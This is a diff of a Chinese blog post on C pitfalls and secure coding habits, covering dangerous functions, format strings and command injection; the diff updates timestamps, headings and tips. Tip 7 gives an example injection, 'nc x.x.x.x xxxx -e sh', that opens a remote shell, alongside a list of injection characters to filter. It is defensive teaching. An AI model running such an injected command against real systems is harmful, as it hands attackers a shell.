@@ -33,7 +33,7 @@
 <meta property="og:description" content="前言如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以使用为主，如果你想深究其原理请看">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-01-23T06:44:14.000Z">
-<meta property="article:modified_time" content="2025-01-25T10:45:39.518Z">
+<meta property="article:modified_time" content="2025-02-11T02:04:34.159Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
     
@@ -423,11 +423,11 @@
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">79</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">98</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -476,8 +476,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-01-25 18:45:39</span>
-            <span class="mobile">2025-01-25 18:45:39</span>
+            <span class="desktop">2025-02-11 10:04:34</span>
+            <span class="mobile">2025-02-11 10:04:34</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -504,24 +504,26 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以使用为主，如果你想深究其原理请看 《Linux环境编程与内核》以及《Linux内核分析》系列文章</p>
-<h2 id="指针相关"><a href="#指针相关" class="headerlink" title="指针相关"></a>指针相关</h2><h3 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a>指针数组和数组指针</h3><h3 id="指针"><a href="#指针" class="headerlink" title="指针++"></a>指针++</h3><h3 id="和"><a href="#和" class="headerlink" title="[] 和 *"></a>[] 和 *</h3><p>其实<code>[]</code>数组符号就是<code>*</code>解引用符号的语法糖实现。</p>
-<h3 id="多级指针"><a href="#多级指针" class="headerlink" title="多级指针"></a>多级指针</h3><h2 id="IO-函数安全"><a href="#IO-函数安全" class="headerlink" title="IO 函数安全"></a>IO 函数安全</h2><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><h2 id="字符串操作函数安全"><a href="#字符串操作函数安全" class="headerlink" title="字符串操作函数安全"></a>字符串操作函数安全</h2><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h2 id="Linux-C-标准编程"><a href="#Linux-C-标准编程" class="headerlink" title="Linux C 标准编程"></a>Linux C 标准编程</h2><h3 id="stdarg-h"><a href="#stdarg-h" class="headerlink" title="stdarg.h"></a>stdarg.h</h3><h2 id="Linux-C-系统编程"><a href="#Linux-C-系统编程" class="headerlink" title="Linux C 系统编程"></a>Linux C 系统编程</h2><h2 id="代码和行为规范问题"><a href="#代码和行为规范问题" class="headerlink" title="代码和行为规范问题"></a>代码和行为规范问题</h2><p>这里并不能罗列所有问题和规范，还需经验总结和习惯。我以安全的视角来提醒一些程序员注意自己的代码规范问题。还有一些内容在其他文章里面。</p>
+			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以使用为主，如果你想深究其原理请看 《Linux环境编程与内核》以及《Linux内核分析》系列文章。</p>
+<h2 id="Linux-C-标准库"><a href="#Linux-C-标准库" class="headerlink" title="Linux C 标准库"></a>Linux C 标准库</h2><h3 id="termios-h"><a href="#termios-h" class="headerlink" title="termios.h"></a>termios.h</h3><h3 id="time-h"><a href="#time-h" class="headerlink" title="time.h"></a>time.h</h3><h3 id="stdarg-h"><a href="#stdarg-h" class="headerlink" title="stdarg.h"></a>stdarg.h</h3><h2 id="Linux-C-系统库"><a href="#Linux-C-系统库" class="headerlink" title="Linux C 系统库"></a>Linux C 系统库</h2><h2 id="指针相关"><a href="#指针相关" class="headerlink" title="指针相关"></a>指针相关</h2><h3 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a>指针数组和数组指针</h3><h3 id="指针"><a href="#指针" class="headerlink" title="指针++"></a>指针++</h3><h3 id="和"><a href="#和" class="headerlink" title="[] 和 *"></a>[] 和 *</h3><p>其实<code>[]</code>数组符号就是<code>*</code>解引用符号的语法糖实现。</p>
+<h3 id="多级指针"><a href="#多级指针" class="headerlink" title="多级指针"></a>多级指针</h3><h2 id="IO-函数安全"><a href="#IO-函数安全" class="headerlink" title="IO 函数安全"></a>IO 函数安全</h2><h2 id="字符串操作函数安全"><a href="#字符串操作函数安全" class="headerlink" title="字符串操作函数安全"></a>字符串操作函数安全</h2><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h2 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h2><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><h2 id="无锁编程"><a href="#无锁编程" class="headerlink" title="无锁编程"></a>无锁编程</h2><h2 id="代码和行为规范问题"><a href="#代码和行为规范问题" class="headerlink" title="代码和行为规范问题"></a>代码和行为规范问题</h2><p>这里并不能罗列所有问题和规范，还需经验总结和习惯。我以安全的视角来提醒一些程序员注意自己的代码规范问题。还有一些内容在其他文章里面。</p>
 <p><strong>1. 把右值放在条件判断的左边</strong></p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_leap</span><span class="params">(<span class="type">const</span> <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">0</span> == y %<span class="number">4</span>  &amp;&amp; <span class="number">0</span> != y % <span class="number">100</span>) || <span class="number">0</span> == y % <span class="number">400</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>这样做的好处是在大型的项目中，不小心把<code>==</code>写成<code>=</code>编译就会报错。否则编译不会出错但是会有警告，对于一些轻视警告的程序员来说这样的<code>bug</code>调试起来是十分费力的。<strong>请重视一切警告和单元测试</strong>。</p>
+<p>这样做的好处是在大型的项目中，不小心把<code>==</code>写成<code>=</code>编译就会报错。否则编译不会出错但是会有警告，对于一些轻视警告的程序员来说这样的<code>bug</code>调试起来是十分费力的。</p>
+<p><strong>1. 重视一切警告和单元测试</strong>。</p>
 <p><strong>2. 把不希望被意外改变的变量传参时把形参定义为 const</strong></p>
 <p><strong>3. 对字符串操作时使用带’n’的函数，即有长度限制的函数（避免溢内存出漏洞）</strong></p>
 <p><strong>4. 不要直接将字符串指针放在格式化字符串函数中（避免格式化字符串漏洞）</strong></p>
 <p><strong>5. 对于IO函数的选取，也要限制读取长度，并且不要超过栈&#x2F;堆上变量大小（避免内存溢出漏洞）</strong></p>
 <p><strong>6. 不要使用<code>gets</code>, <code>strcpy</code>, <code>sprintf</code>, <code>memcpy</code>, <code>strcat</code>等危险函数（容易导致内存溢出漏洞）</strong></p>
 <p><strong>7. 使用 <code>system</code> 和 <code>exec</code> 家族的函数 和 <code>popn</code> 等命令执行函数时，要过滤所有可能导致命令注入的字符串 “&amp;”  “$”  “|”  “&amp;&amp;”  “||”  “;”  “!”  “ `” 等潜在的命令注入字符。eg. system(“you_code; nc x.x.x.x xxxx -e sh;”)</strong></p>
-<p><strong>8. 加 -Wall 并且不要忽视任何警告信息</strong></p>
+<p><strong>8. 编译时加 -Wall 并且不要忽视任何警告信息</strong></p>
 <p><strong>9. 不要忽略任何一次小的单元测试</strong></p>
-<p><strong>10. 少用或者不用递归函数，可能导致内存爆炸</strong></p>
+<p><strong>10. 当不能使用简单点循环解决问题，再考虑递归函数，否则程序开销会很大</strong></p>
 <p><strong>11. 循环数组时，数组的大小要用宏定义定义好，或者使用<code>sizeof</code>来计算数组的大小，这样修改数组的大小</strong></p>
-<h1 id="几个C语言小项目"><a href="#几个C语言小项目" class="headerlink" title="几个C语言小项目"></a>几个C语言小项目</h1>
+<h1 id="C-语言项目"><a href="#C-语言项目" class="headerlink" title="C 语言项目"></a>C 语言项目</h1><p>学之前可以先看一下博客中《数据结构与算法》这篇文章。</p>
+<h2 id="基础项目"><a href="#基础项目" class="headerlink" title="基础项目"></a>基础项目</h2><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><h3 id="内存池"><a href="#内存池" class="headerlink" title="内存池"></a>内存池</h3>
 		</div>
 
 		
@@ -535,7 +537,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-01-25 18:45:39
+                    :</strong> 2025-02-11 10:04:34
             </li>
         
         <li>
@@ -578,9 +580,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/01/23/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0-C%E5%92%8CPython/">
+				<a class="next" rel="next" href="/2025/01/21/Qt6%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">机器学习算法实现-C和Python</span>
+						<span class="post-nav-title-item">Qt6开发指南</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -656,7 +658,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">C语言编程</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E7%9B%B8%E5%85%B3"><span class="nav-text">指针相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88"><span class="nav-text">指针数组和数组指针</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88"><span class="nav-text">指针++</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%92%8C"><span class="nav-text">[] 和 *</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88"><span class="nav-text">多级指针</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8"><span class="nav-text">IO 函数安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="nav-text">缓冲区</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8"><span class="nav-text">字符串操作函数安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="nav-text">线程安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-C-%E6%A0%87%E5%87%86%E7%BC%96%E7%A8%8B"><span class="nav-text">Linux C 标准编程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#stdarg-h"><span class="nav-text">stdarg.h</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-C-%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B"><span class="nav-text">Linux C 系统编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%92%8C%E8%A1%8C%E4%B8%BA%E8%A7%84%E8%8C%83%E9%97%AE%E9%A2%98"><span class="nav-text">代码和行为规范问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%A0%E4%B8%AAC%E8%AF%AD%E8%A8%80%E5%B0%8F%E9%A1%B9%E7%9B%AE"><span class="nav-text">几个C语言小项目</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-C-%E6%A0%87%E5%87%86%E5%BA%93"><span class="nav-text">Linux C 标准库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#termios-h"><span class="nav-text">termios.h</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#time-h"><span class="nav-text">time.h</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stdarg-h"><span class="nav-text">stdarg.h</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-C-%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="nav-text">Linux C 系统库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E7%9B%B8%E5%85%B3"><span class="nav-text">指针相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88"><span class="nav-text">指针数组和数组指针</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88"><span class="nav-text">指针++</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%92%8C"><span class="nav-text">[] 和 *</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88"><span class="nav-text">多级指针</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8"><span class="nav-text">IO 函数安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8"><span class="nav-text">字符串操作函数安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="nav-text">线程安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B"><span class="nav-text">异步编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B"><span class="nav-text">网络编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E9%94%81%E7%BC%96%E7%A8%8B"><span class="nav-text">无锁编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%92%8C%E8%A1%8C%E4%B8%BA%E8%A7%84%E8%8C%83%E9%97%AE%E9%A2%98"><span class="nav-text">代码和行为规范问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C-%E8%AF%AD%E8%A8%80%E9%A1%B9%E7%9B%AE"><span class="nav-text">C 语言项目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E9%A1%B9%E7%9B%AE"><span class="nav-text">基础项目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0"><span class="nav-text">线程池</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B1%A0"><span class="nav-text">进程池</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B1%A0"><span class="nav-text">内存池</span></a></li></ol></li></ol></li></ol>
 
 	</div>
 </div>
@@ -685,7 +687,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        79 posts in total
+                        98 posts in total
                     </span>
                     
                 </p>
